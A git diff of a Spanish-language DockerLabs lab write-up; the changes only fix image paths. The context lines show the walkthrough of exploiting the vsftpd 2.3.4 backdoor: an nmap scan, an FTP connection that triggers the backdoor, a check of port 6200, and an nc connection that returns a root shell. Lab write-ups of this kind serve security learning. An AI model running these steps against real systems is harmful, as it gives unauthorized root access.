@@ -23,7 +23,7 @@ Realicé un escaneo básico con `nmap` para identificar servicios activos:
 nmap -sC -sV -oN escaneo_inicial.txt 172.17.0.2
 ```
 
-![nmap inicial](DockerLabs\images\firsthacking_nmap.png)
+![nmap inicial](images\firsthacking_nmap.png)
 El FTP está corriendo vsftpd 2.3.4, una versión vulnerable con una backdoor conocida.
 
 ---
@@ -37,7 +37,7 @@ Conexión inicial al FTP:
 ftp 172.17.0.2
 ```
 
-![conexion ftp](DockerLabs\images\firsthacking_ftp.png)
+![conexion ftp](images\firsthacking_ftp.png)
 Este comando no autentica al usuario, sino que activa la backdoor del servicio.
 
 ---
@@ -50,7 +50,7 @@ Una vez activada, vsftpd abre el puerto 6200/tcp. Para confirmarlo, se escaneó 
 nmap -p 6200 172.17.0.2
 ```
 
-![verificar con nmap](DockerLabs\images\firsthacking_nmap_6200.png)
+![verificar con nmap](images\firsthacking_nmap_6200.png)
 El puerto backdoor está abierto.
 
 ---
@@ -63,5 +63,5 @@ Se obtiene acceso directo al sistema mediante nc:
 nc 172.17.0.2 6200
 ```
 
-![acceso root](DockerLabs\images\firsthacking_usuario_root.png)
+![acceso root](images\firsthacking_usuario_root.png)
 La conexión entrega una shell como root automáticamente, confirmando la explotación exitosa.
